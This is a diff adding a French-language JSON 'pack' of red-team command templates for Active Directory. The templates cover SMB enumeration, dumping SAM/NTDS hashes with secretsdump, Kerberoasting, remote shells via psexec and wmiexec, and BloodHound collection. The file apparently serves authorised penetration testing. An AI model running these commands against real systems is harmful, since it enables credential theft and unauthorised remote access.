@@ -1,0 +1,103 @@
+{
+  "pack_id": "ad-windows",
+  "pack_name": "Active Directory & Windows",
+  "author": "MIDINS Forge",
+  "version": "1.0",
+  "color": "#818cf8",
+  "icon": "castle",
+  "pack_tags": [
+    "Red Team",
+    "Windows/AD"
+  ],
+  "description": "Énumération et attaques courantes sur un environnement Active Directory.",
+  "scripts": [
+    {
+      "id": "enum4linux-full",
+      "title": "Enum4linux",
+      "category": "AD",
+      "description": "Énumération SMB/NetBIOS classique (utilisateurs, partages, politique de mots de passe).",
+      "template": "enum4linux -a {{TARGET_IP}}",
+      "tags": [
+        "enum4linux",
+        "smb"
+      ]
+    },
+    {
+      "id": "smbclient-list-shares",
+      "title": "SMBClient — Lister les partages",
+      "category": "AD",
+      "description": "Liste les partages SMB accessibles sur un hôte.",
+      "template": "smbclient -L //{{TARGET_IP}}/ -U {{USERNAME:guest}}",
+      "tags": [
+        "smbclient",
+        "smb"
+      ]
+    },
+    {
+      "id": "crackmapexec-users",
+      "title": "CrackMapExec — Utilisateurs",
+      "category": "AD",
+      "description": "Énumère les utilisateurs du domaine via un compte SMB valide.",
+      "template": "nxc smb {{TARGET_IP}} -u {{USERNAME}} -p {{PASSWORD}} --users",
+      "tags": [
+        "crackmapexec",
+        "ad"
+      ]
+    },
+    {
+      "id": "impacket-secretsdump",
+      "title": "Impacket — secretsdump",
+      "category": "AD",
+      "description": "Extrait les hashs (SAM/NTDS) via un accès administrateur.",
+      "template": "impacket-secretsdump {{DOMAIN:WORKGROUP}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET_IP}}",
+      "tags": [
+        "impacket",
+        "ad"
+      ]
+    },
+    {
+      "id": "impacket-getuserspns",
+      "title": "Impacket — GetUserSPNs (Kerberoast)",
+      "category": "AD",
+      "description": "Récupère les tickets de service Kerberos à cracker hors ligne.",
+      "template": "impacket-GetUserSPNs {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}} -dc-ip {{DC_IP}} -request",
+      "tags": [
+        "impacket",
+        "kerberoast"
+      ]
+    },
+    {
+      "id": "impacket-psexec",
+      "title": "Impacket — psexec",
+      "category": "AD",
+      "description": "Ouvre un shell distant via SMB avec des identifiants administrateur valides.",
+      "template": "impacket-psexec {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET_IP}}",
+      "tags": [
+        "impacket",
+        "shell"
+      ]
+    },
+    {
+      "id": "impacket-wmiexec",
+      "title": "Impacket — wmiexec",
+      "category": "AD",
+      "description": "Exécution de commandes à distance via WMI (moins bruyant que psexec).",
+      "template": "impacket-wmiexec {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET_IP}}",
+      "tags": [
+        "impacket",
+        "wmi"
+      ]
+    },
+    {
+      "id": "bloodhound-ingestor",
+      "title": "BloodHound — Collecte",
+      "category": "AD",
+      "description": "Collecte les relations AD pour analyse des chemins d'attaque dans BloodHound.",
+      "template": "bloodhound-python -u {{USERNAME}} -p {{PASSWORD}} -d {{DOMAIN}} -ns {{DC_IP}} -c All",
+      "tags": [
+        "bloodhound",
+        "ad"
+      ]
+    }
+  ]
+}
